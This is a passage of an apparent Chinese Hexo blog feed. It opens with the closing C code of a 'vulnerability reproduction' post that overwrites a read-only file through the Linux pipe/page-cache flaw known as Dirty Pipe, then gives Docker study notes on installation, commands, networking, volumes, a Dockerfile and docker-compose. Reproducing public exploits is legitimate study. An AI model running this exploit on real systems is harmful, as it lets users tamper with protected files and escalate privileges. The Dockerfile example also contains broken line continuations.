class="hljs-keyword">sizeof</span>(buffer) ? <span class="hljs-keyword">sizeof</span>(buffer) : r;<br>read(p[<span class="hljs-number">0</span>], buffer, n);<br>r -= n;<br>&#125;<br><br><span class="hljs-comment">/* the pipe is now empty, and if somebody adds a new</span><br><span class="hljs-comment">   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span><br><span class="hljs-comment">   will be mergeable */</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">4</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Usage: %s TARGETFILE OFFSET DATA\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* dumb command-line argument parser */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-type">const</span> path = argv[<span class="hljs-number">1</span>];<br><span class="hljs-type">loff_t</span> offset = strtoul(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-type">const</span> data = argv[<span class="hljs-number">3</span>];<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> data_size = <span class="hljs-built_in">strlen</span>(data);<br><br><span class="hljs-keyword">if</span> (offset % PAGE_SIZE == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-type">const</span> <span class="hljs-type">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">loff_t</span> end_offset = offset + (<span class="hljs-type">loff_t</span>)data_size;<br><span class="hljs-keyword">if</span> (end_offset &gt; next_page) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* open the input file and validate the specified offset */</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> fd = open(path, O_RDONLY); <span class="hljs-comment">// yes, read-only! :-)</span><br><span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;open failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><span class="hljs-keyword">if</span> (fstat(fd, &amp;st)) &#123;<br>perror(<span class="hljs-string">&quot;stat failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (offset &gt; st.st_size) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Offset is not inside the file\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (end_offset &gt; st.st_size) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* create the pipe with all flags initialized with</span><br><span class="hljs-comment">   PIPE_BUF_FLAG_CAN_MERGE */</span><br><span class="hljs-type">int</span> p[<span class="hljs-number">2</span>];<br>prepare_pipe(p);<br><br><span class="hljs-comment">/* splice one byte from before the specified offset into the</span><br><span class="hljs-comment">   pipe; this will add a reference to the page cache, but</span><br><span class="hljs-comment">   since copy_page_to_iter_pipe() does not initialize the</span><br><span class="hljs-comment">   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span><br>--offset;<br><span class="hljs-type">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;splice failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><span class="hljs-keyword">if</span> (nbytes == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;short splice\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* the following write will not create a new pipe_buffer, but</span><br><span class="hljs-comment">   will instead write into the page cache, because of the</span><br><span class="hljs-comment">   PIPE_BUF_FLAG_CAN_MERGE flag */</span><br>nbytes = write(p[<span class="hljs-number">1</span>], data, data_size);<br><span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;write failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><span class="hljs-keyword">if</span> ((<span class="hljs-type">size_t</span>)nbytes &lt; data_size) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;short write\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It worked!\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure><p>参考:<a href="https://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg">https://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker学习笔记</title>
    <link href="/2022/04/17/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/04/17/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="docker学习笔记"><a href="#docker学习笔记" class="headerlink" title="docker学习笔记"></a>docker学习笔记</h1><h2 id="1-什么是docker"><a href="#1-什么是docker" class="headerlink" title="1.什么是docker?"></a>1.什么是docker?</h2><p>1.docker是一种基于容器的虚拟化技术,可以让开发者将开发的软件以及依赖打包成一个镜像然后发布到任何流行的linux或windows服务器上面</p><h2 id="2-为什么要用docker"><a href="#2-为什么要用docker" class="headerlink" title="2.为什么要用docker?"></a>2.为什么要用docker?</h2><p>作为一种新兴的虚拟化方式，Docker 跟传统的虚拟化方式相比具有众多的优势。</p><ul><li>更高效的系统利用资源</li></ul><p>由于容器不需要进行硬件虚拟以及运行完整操作系统等额外开销，Docker 对系统资源的利用率更高。无论是应用执行速度、内存损耗或者文件存储速度，都要比传统虚拟机技术更高效。因此，相比虚拟机技术，一个相同配置的主机，往往可以运行更多数量的应用。</p><ul><li>更快速的启动时间</li></ul><p>由于容器不需要进行硬件虚拟以及运行完整操作系统等额外开销，Docker 对系统资源的利用率更高。无论是应用执行速度、内存损耗或者文件存储速度，都要比传统虚拟机技术更高效。因此，相比虚拟机技术，一个相同配置的主机，往往可以运行更多数量的应用。</p><ul><li>一致的运行环境</li></ul><p>开发过程中一个常见的问题是环境一致性问题。由于开发环境、测试环境、生产环境不一致，导致有些 bug 并未在开发过程中被发现。而 Docker 的镜像提供了除内核外完整的运行时环境，确保了应用运行环境一致性，从而不会再出现 「这段代码在我机器上没问题啊」 这类问题。</p><ul><li>持续交付和部署</li></ul><p>对开发和运维（DevOps）人员来说，最希望的就是一次创建或配置，可以在任意地方正常运行。<br>使用 Docker 可以通过定制应用镜像来实现持续集成、持续交付、部署。开发人员可以通过 Dockerfile 来进行镜像构建，并结合 持续集成(Continuous Integration) 系统进行集成测试，而运维人员则可以直接在生产环境中快速部署该镜像，甚至结合 持续部署(Continuous Delivery&#x2F;Deployment) 系统进行自动部署。<br>而且使用 Dockerfile 使镜像构建透明化，不仅仅开发团队可以理解应用运行环境，也方便运维团队理解应用运行所需条件，帮助更好的生产环境中部署该镜像</p><ul><li>更轻松的迁移</li></ul><p>由于 Docker 确保了执行环境的一致性，使得应用的迁移更加容易。Docker 可以在很多平台上运行，无论是物理机、虚拟机、公有云、私有云，其运行结果是一致的。因此用户可以很轻易的将在一个平台上运行的应用，迁移到另一个平台上，而不用担心运行环境的变化导致应用无法正常运行的情况。</p><ul><li>更轻松的维护和扩展</li></ul><p>Docker 使用的分层存储以及镜像的技术，使得应用重复部分的复用更为容易，也使得应用的维护更新更加简单，基于基础镜像进一步扩展镜像也变得非常简单。此外，Docker 团队同各个开源项目团队一起维护了一大批高质量的 官方镜像，既可以直接在生产环境使用，又可以作为基础进一步定制，大大的降低了应用服务的镜像制作成本。</p><h2 id="3-docker架构"><a href="#3-docker架构" class="headerlink" title="3.docker架构"></a>3.docker架构</h2><h4 id="3-1-docker三个概念"><a href="#3-1-docker三个概念" class="headerlink" title="3.1.docker三个概念"></a>3.1.docker三个概念</h4><ul><li><p>容器</p><p>容器时镜像的运行实例,容器可以启动,停止,删除。</p></li><li><p>镜像</p><p>创建docker容器的模板,相当于一个根文件系统,在docker运行的时候,docker会将镜像挂载</p></li><li><p>仓库</p><p>存储docker镜像的仓库</p><p>docker实现结构</p><p><img src="/images/docker-on-linux.png" alt="&quot;docker&quot;"></p></li></ul><h2 id="4-docker体系结构"><a href="#4-docker体系结构" class="headerlink" title="4.docker体系结构"></a>4.docker体系结构</h2><p>docker采用C&#x2F;S结构,docker daemon作为server接收client的请求,client和server可以运行在同一台机器上,也可以使用socket通信的方式运行在不同的机器上面</p><ul><li>docker守护进程(docker deamon)</li></ul><p>docker在后台运行的服务端程序,等待docker client的请求</p><ul><li><p>docker客户端(docker client)</p><p>是用户与Docker交互方式。它接受用户指令并且与背后的Docker守护进程通信。</p></li></ul><h2 id="5-docker安装"><a href="#5-docker安装" class="headerlink" title="5.docker安装"></a>5.docker安装</h2><p>1.脚本安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -fsSL https://get.docker.com -o get-docker.sh<br>./get-docker.sh<br></code></pre></td></tr></table></figure><p>2.包管理器安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pacman -S docker<br></code></pre></td></tr></table></figure><p>3.docker换源</p><p>编辑&#x2F;etc&#x2F;docker&#x2F;daemon.json文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<br>  <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>    <span class="hljs-string">&quot;https://hub-mirror.c.163.com&quot;</span>,<br>    <span class="hljs-string">&quot;https://ustc-edu-cn.mirror.aliyuncs.com&quot;</span>,<br>    <span class="hljs-string">&quot;https://ghcr.io&quot;</span>,<br>    <span class="hljs-string">&quot;https://mirror.baidubce.com&quot;</span><br>  ]<br>&#125;<br><span class="hljs-comment">#换源后需要重启docker才能生效</span><br>systemctl restart docker<br></code></pre></td></tr></table></figure><h2 id="6-docker使用"><a href="#6-docker使用" class="headerlink" title="6.docker使用"></a>6.docker使用</h2><h3 id="6-1-docker的基本使用"><a href="#6-1-docker的基本使用" class="headerlink" title="6.1.docker的基本使用"></a>6.1.docker的基本使用</h3><p>1.获取镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull helloworld<br></code></pre></td></tr></table></figure><p>2.创建并运行容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it image:tag <span class="hljs-built_in">command</span><br><span class="hljs-comment">#-i(interactive)以交互方式启动docker容器</span><br><span class="hljs-comment">#-t(tty)分配一个tty</span><br><span class="hljs-comment">#--hostname 指定容器内的主机名</span><br><span class="hljs-comment">#--name 指定容器的名称</span><br><span class="hljs-comment">#--privileged 赋予容器root权限</span><br><span class="hljs-comment">#-p 指定端口映射</span><br><span class="hljs-comment">#-v 映射容器卷</span><br><span class="hljs-comment">#command 指需要执行的命令</span><br>注意:正在运行的docker容器一定要有一个前台进程,否则该docker会认为没有正在运行的进程,即退出该容器<br></code></pre></td></tr></table></figure><p>3.启动或停止docker容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看所有的容器</span><br>docker ps -a<br><span class="hljs-comment">#启动一个docker容器</span><br>docker start $(container_id)<br>docker stop $(container_id)<br></code></pre></td></tr></table></figure><p>4.其他常用的docker命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> -it /bin/bash<br><span class="hljs-comment">#在容器内重新开启一个shell,并且进入到该shell</span><br>docker attach container_id<br><span class="hljs-comment">#进入到指定容器id内正在运行的终端</span><br>docker top container_id<br><span class="hljs-comment">#查看某容器内的进程情况</span><br>docker logs container_id<br><span class="hljs-comment">#查看某容器的日志</span><br>docker inspect container_id<br><span class="hljs-comment">#查看某容器的配置以及详细信息</span><br>docker commit -a <span class="hljs-string">&quot;&quot;</span> -m <span class="hljs-string">&quot;&quot;</span> container_id image:tag<br><span class="hljs-comment">#将某一个容器打包成镜像</span><br>docker <span class="hljs-built_in">export</span> container_id &gt; ubuntu.tar<br><span class="hljs-comment">#导出一个docker容器(不包含映射的容器卷以及映射路径)</span><br><span class="hljs-built_in">cat</span> docker/ubuntu.tar | docker import - <span class="hljs-built_in">test</span>/ubuntu:v1<br><span class="hljs-comment">#将一个tar包导入成docker镜像</span><br>docker <span class="hljs-built_in">rm</span> container_id<br><span class="hljs-comment">#删除一个docker容器</span><br></code></pre></td></tr></table></figure><h3 id="6-2-docker网络"><a href="#6-2-docker网络" class="headerlink" title="6.2.docker网络"></a>6.2.docker网络</h3><p>docker一共有5中网络模式</p><ul><li><p>bridge</p><p>docker的默认网络模式,创建一块虚拟网卡连接上物理网卡,所有的docker将库创建一对虚拟接口,veth&amp;eth0一个在容器内，一个在网桥上,网桥提供路由功能,(可以想象为虚拟机内的nat模式)</p></li><li><p>macvlan</p><p>创建一个虚拟网卡,直接连接至物理网卡,该网络模式下容器分配的ip地址和物理机在同一个网段(相当于虚拟机内的桥接模式)</p></li><li><p>host</p><p>与宿主机共享网卡</p></li><li><p>container</p><p>和已经存在的容器共享一块网卡</p></li><li><p>none</p><p>不创建网络,无法联网</p></li></ul><h5 id="docker网络的创建"><a href="#docker网络的创建" class="headerlink" title="docker网络的创建"></a>docker网络的创建</h5>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建一个桥接的docker网络</span><br>docker network creat -d bridge --subnet=172.20.0.1/24 --gateway=172.20.0.1 -o parent=eth0 mybridge<br></code></pre></td></tr></table></figure><h2 id="6-3-docker数据卷"><a href="#6-3-docker数据卷" class="headerlink" title="6.3.docker数据卷"></a>6.3.docker数据卷</h2><p>  因为docker容器中的数据在docker容器删除后会全部消失,因此可以借助docker容器数据卷来实现docker容i数据的本地持久化.docker容器数据卷永久有效,除非手动删除,并且docker数据卷可以让多个docker容器共享数据</p><h5 id="数据卷的创建"><a href="#数据卷的创建" class="headerlink" title="数据卷的创建"></a>数据卷的创建</h5>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker volume create volume_name<br></code></pre></td></tr></table></figure><h5 id="数据卷的挂载"><a href="#数据卷的挂载" class="headerlink" title="数据卷的挂载"></a>数据卷的挂载</h5>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it -v volume_name:container_path image_name<br></code></pre></td></tr></table></figure><h2 id="7-Dockerfile"><a href="#7-Dockerfile" class="headerlink" title="7.Dockerfile"></a>7.Dockerfile</h2><h5 id="什么是Dockerfile"><a href="#什么是Dockerfile" class="headerlink" title="什么是Dockerfile?"></a>什么是Dockerfile?</h5><p>  dockerfile是一个用于构建docker镜像的脚本,docker可以读取dockerfile文件自动构建docker镜像</p><h5 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用?"></a>如何使用?</h5>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#当dockerfile命名为Dockerfile并且当前在dockerfile路径下</span><br>docker build -t name:tag .<br><span class="hljs-comment">#指定dockerfile文件路径</span><br>docker build -f /path/to/dockerfile -t name:tag<br></code></pre></td></tr></table></figure><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5>  <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:latest<br><span class="hljs-keyword">MAINTAINER</span> bugprogram-git<br><span class="hljs-keyword">ENV</span> TZ=Asia/Shanghai<br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&#x27;s/archive.ubuntu.com/mirrors.aliyun.com/g&#x27;</span> /etc/apt/sources.list \ </span><br>&amp;&amp; apt-get update \<br>&amp;&amp; ln -snf /usr/share/zoneinfo/$TZ /etc/localtime <br>&amp;&amp; echo $TZ &gt; /etc/timezone \<br>apt-get install -y tzdata unzip wget npm curl \<br>&amp;&amp; apt-get clean \<br>&amp;&amp; apt-get autoclean \<br>&amp;&amp; rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*<br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /minecraft \</span><br><span class="language-bash">&amp;&amp; <span class="hljs-built_in">mkdir</span> /minecraft/dashboard \</span><br><span class="language-bash">&amp;&amp; wget https://github.com/Suwings/MCSManager/archive/refs/tags/v8.6.23.zip \</span><br><span class="language-bash">&amp;&amp; unzip v8.6.23.zip -d /minecraft/dashboard </span><br><span class="hljs-comment">#同样的后面的文件名以及解压的目录名要根据实际情况进行修改</span><br>&amp;&amp; mv /minecraft/dashboard/MCSManager-<span class="hljs-number">8.6</span>.<span class="hljs-number">23</span>/* /minecraft/dashboard <br>&amp;&amp; rm -rf /minecraft/dashboard/MCSManager-<span class="hljs-number">8.6</span>.<span class="hljs-number">23</span> \<br>&amp;&amp; apt purge  -y unzip wget \<br>&amp;&amp; apt autoremove -y \<br>&amp;&amp; rm /v8.<span class="hljs-number">6.23</span>.zip \<br>&amp;&amp; cd /minecraft/dashboard &amp;&amp; npm install<br><span class="hljs-keyword">EXPOSE</span> [<span class="hljs-number">19132</span>,<span class="hljs-number">23333</span>]<br><span class="hljs-comment">#对外暴露的端口</span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /minecraft/dashboard/ &amp;&amp; npm start</span><br></code></pre></td></tr></table></figure><h2 id="8-docker-compose"><a href="#8-docker-compose" class="headerlink" title="8.docker-compose"></a>8.docker-compose</h2><h5 id="什么是docker-compose"><a href="#什么是docker-compose" class="headerlink" title="什么是docker-compose?"></a>什么是docker-compose?</h5><p>  docker-compose是一个用python写的容器编排工具,在连续部署多个容器的时候,可以使用一个docker-compose脚本实现一次部署多个容器,大大提高了容器编排效率</p><h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3.0&#x27;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">web:</span><br>  <span class="hljs-comment">#容器名称</span><br>    <span class="hljs-attr">build:</span> <span class="hljs-string">.</span><br>    <span class="hljs-comment">#指定构建的上下文路径</span><br>    <span class="hljs-attr">image:</span><br>    <span class="hljs-comment">#指定镜像的名称</span><br>      <span class="hljs-string">nginx:alpine</span><br>    <span class="hljs-attr">ports:</span><br>    <span class="hljs-comment">#指定映射的端口</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;5000:5000&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>    <span class="hljs-comment">#指定挂载的容器卷</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">volumes:/code</span><br>    <span class="hljs-attr">links:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span><br>  <span class="hljs-attr">redis:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">redis:latest</span><br><span class="hljs-attr">volumes:</span><br>  <span class="hljs-string">redis:&#123;&#125;</span><br><span class="hljs-comment">#定义网络</span><br><span class="hljs-attr">networks:</span><br>  <span class="hljs-attr">default:</span><br>    <span class="hljs-attr">external:</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">my-pre-existing-network</span><br>      <span class="hljs-comment">#这里不能使用默认的docker0网络,只能使用用户自定义的网络</span><br></code></pre></td></tr></table></figure><p>  docker-compose常用的一些属性如下:</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span 